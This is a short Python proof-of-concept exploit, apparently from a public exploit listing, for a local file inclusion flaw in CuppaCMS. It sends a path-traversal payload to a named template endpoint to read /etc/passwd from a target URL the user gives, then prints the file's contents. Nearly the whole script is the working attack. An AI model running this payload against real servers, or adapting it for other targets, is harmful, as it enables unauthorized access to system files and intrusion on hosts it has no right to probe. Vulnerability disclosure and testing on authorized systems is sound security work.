#!/usr/bin/envpython3

# Exploit title: CuppaCMS -  local file inclusion
# Vendor Homepage: https://www.cuppacms.com/
# Version: ?
# Tested on: Debian 10 web server
# Date: Jan 06, 2022
# Exploit author: Mateo Han≈æek
# Example usage: python3 poc.py "http://IP_ADDRESS/CuppaCMS"


import requests                                                                                                                              
import argparse
import sys
    
headers = {}
headers['Accept'] = "*/*"
headers["Content-Type"] = "application/x-www-form-urlencoded"


def main():
    parser = argparse.ArgumentParser(description="PoC exploit for CuppaCMS 4 January 2022.")
    parser.add_argument("url", type=str, metavar="URL", help="\t\t Specify url. Ex: 'http://10.10.10.10/CuppaCMS' ")
    
    args = parser.parse_args()
    url = args.url

    u = url + "/templates/default/html/windows/right.php"
    data = "url=../../../../../../../../../etc/passwd"

    req = requests.post(u, headers = headers, data=data)
    if("root:x:" in req.text):
        print("[+] LFI vulnerable, requesting /etc/passwd\n")
        print(req.text)
    else:
        print("[-] Not vulnerable")

if __name__ == "__main__":
    main()